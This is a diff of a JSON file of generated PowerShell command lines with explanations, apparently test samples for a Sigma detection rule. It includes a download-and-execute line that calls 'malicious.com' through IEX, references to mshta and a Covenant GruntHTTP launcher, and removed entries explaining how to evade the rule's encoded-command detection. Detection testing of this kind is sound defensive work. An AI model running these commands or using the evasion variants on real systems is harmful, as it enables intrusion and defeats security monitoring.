@@ -1,14 +1,24 @@
+```json
 [
   {
-    "output": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"iex ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('...')))\"",
-    "explanation": "This command uses equivalent syntax for '-Nop' as '-NoProfile', '-Sta' is omitted since it's not required for execution, and '-Command' is used instead of '-EncodedCommand' to bypass the rule by avoiding base64-encoded payloads."
+    "output": "powershell.exe -Sta -Nop -Window Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"",
+    "explanation": "This command includes the suspicious flags '-Sta', '-Nop', '-Window Hidden', and '-Command', which match the Sigma rule. It simulates a PowerShell command line that could be used to execute a remote payload."
   },
   {
-    "output": "powershell.exe -W Hidden -ExecutionPolicy Bypass -Command \"[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cwB2ACAAbwAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACkAOwBzAHYAIABkACAA')) | iex\"",
-    "explanation": "This command uses '-W' as a shorthand for '-WindowStyle', omits '-Sta' and '-Nop' as they are not strictly necessary for execution, and uses '-Command' instead of '-EncodedCommand' to avoid triggering the rule based on encoded command detection."
+    "output": "powershell.exe -Sta -Nop -WindowStyle Hidden -EncodedCommand cwB2ACAAbwAgA",
+    "explanation": "This command includes the suspicious flags '-Sta', '-Nop', '-WindowStyle Hidden', and '-EncodedCommand', which match the Sigma rule. It simulates a PowerShell command line using an encoded command, which is a common evasion technique."
   },
   {
-    "output": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('...')) | iex\"",
-    "explanation": "This command uses full syntax for '-WindowStyle' instead of '-W', omits '-Sta' and '-Nop' as they are not required for execution, and avoids '-EncodedCommand' to bypass the rule's encoded command detection."
+    "output": "powershell.exe -Nop -WindowStyle Hidden -Command \"mshta file.hta\"",
+    "explanation": "This command includes the suspicious flags '-Nop', '-WindowStyle Hidden', and the string 'mshta file.hta', which matches the Sigma rule's selection_2 criteria. It simulates a PowerShell command line attempting to execute an HTA file."
+  },
+  {
+    "output": "powershell.exe -Sta -Nop -WindowStyle Hidden -Command \"sv o (New-Object IO.MemoryStream); sv d (New-Object IO.MemoryStream);\"",
+    "explanation": "This command includes the suspicious flags '-Sta', '-Nop', '-WindowStyle Hidden', and the string 'sv o (New-Object IO.MemoryStream); sv d (New-Object IO.MemoryStream);', which matches the Sigma rule's selection_2 criteria. It simulates a PowerShell command line attempting to create memory streams, which can be used for evasion."
+  },
+  {
+    "output": "powershell.exe -Sta -Nop -WindowStyle Hidden -Command \"GruntHTTP\"",
+    "explanation": "This command includes the suspicious flags '-Sta', '-Nop', '-WindowStyle Hidden', and the string 'GruntHTTP', which matches the Sigma rule's selection_2 criteria. It simulates a PowerShell command line attempting to execute a Covenant GruntHTTP launcher."
   }
 ]
+```
